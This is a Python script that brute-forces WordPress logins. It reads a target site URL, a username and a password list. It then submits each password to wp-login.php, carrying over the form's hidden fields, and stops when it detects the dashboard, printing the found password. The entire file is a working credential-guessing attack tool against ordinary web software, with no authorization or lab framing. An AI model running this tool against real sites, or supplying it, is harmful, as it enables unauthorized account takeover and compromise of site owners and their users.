import requests
from bs4 import BeautifulSoup

# Function to test WordPress login
def test_wordpress_login(target_url, username, password):
    # WordPress login URL
    login_url = f"{target_url}/wp-login.php"
    
    # Create a session to maintain cookies
    session = requests.Session()
    
    try:
        # Step 1: Send a GET request to retrieve the login page and extract the nonce (if applicable)
        response = session.get(login_url, timeout=10)
        if response.status_code != 200:
            print(f"Error connecting to the site. Status code: {response.status_code}")
            return False
        
        # Parse the login page to extract the login form data
        soup = BeautifulSoup(response.text, 'html.parser')
        login_form = soup.find('form', {'name': 'loginform'})
        if not login_form:
            print("Login form not found on the page.")
            return False
        
        # Extract hidden fields (like nonce or redirect_to)
        hidden_fields = login_form.find_all('input', {'type': 'hidden'})
        form_data = {field['name']: field.get('value', '') for field in hidden_fields}
        
        # Add username and password to the form data
        form_data['log'] = username
        form_data['pwd'] = password
        form_data['wp-submit'] = 'Log In'
        
        # Step 2: Send a POST request to log in
        response = session.post(login_url, data=form_data, timeout=10, allow_redirects=True)
        
        # Step 3: Check if login was successful
        if "Dashboard" in response.text or "wp-admin" in response.url:
            print(f"\033[92mCorrect password found: {password}\033[0m")  # Print in green
            return True
        else:
            print(f"Incorrect password: {password}")
            return False
    except requests.exceptions.RequestException as e:
        print(f"Error connecting to the server: {e}")
        return False

# Main function
def main():
    # Get user inputs
    target_url = input("Please enter the target WordPress site URL (e.g., https://example.com): ").strip()
    username = input("Please enter the username: ").strip()
    password_list_path = input("Please enter the path to the password list file: ").strip()
    
    # Read the password list from the file
    try:
        with open(password_list_path, 'r', encoding='utf-8') as file:
            passwords = file.read().splitlines()
    except FileNotFoundError:
        print(f"File {password_list_path} not found.")
        return
    except Exception as e:
        print(f"Error reading the file: {e}")
        return
    
    # Test all passwords
    for password in passwords:
        if test_wordpress_login(target_url, username, password):
            break

if __name__ == "__main__":
    main()